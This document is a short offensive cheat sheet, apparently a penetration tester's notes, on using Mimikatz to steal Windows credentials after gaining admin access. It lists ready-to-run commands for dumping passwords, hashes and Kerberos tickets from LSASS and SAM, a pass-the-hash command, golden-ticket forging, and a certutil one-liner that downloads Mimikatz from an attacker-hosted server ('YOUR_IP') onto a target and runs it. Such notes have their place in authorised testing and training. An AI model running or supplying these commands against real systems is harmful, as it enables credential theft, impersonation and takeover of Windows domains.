---
tags: [tool, privesc, windows, credentials]
tool: "mimikatz"
category: "Privesc"
installed: true
phase: [post-exploit, creds]
---

# Mimikatz - Windows Credential Dumper

## Tool Overview
Purpose: Extract plaintext passwords, hashes, PINs, and Kerberos tickets from memory
Location: /usr/share/mimikatz/

## When to Use
- When you have admin/SYSTEM access
- To dump credentials from LSASS
- For pass-the-hash attacks
- To extract Kerberos tickets

## How to Use It

Location:
cd /usr/share/mimikatz/x64/
./mimikatz.exe

Basic Commands:
privilege::debug
sekurlsa::logonpasswords
lsadump::lsa /patch
token::elevate
vault::cred
dpapi::masterkey

Dump All:
privilege::debug
sekurlsa::logonpasswords
lsadump::lsa /patch
lsadump::sam
lsadump::cache

Pass-the-Hash:
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:HASH /run:cmd.exe

Golden Ticket:
kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ticket:ticket.kirbi

Transfer to Target:
On Kali: cd /usr/share/mimikatz/x64/ && python3 -m http.server 8000
On target: certutil -urlcache -f http://YOUR_IP:8000/mimikatz.exe mimikatz.exe && mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
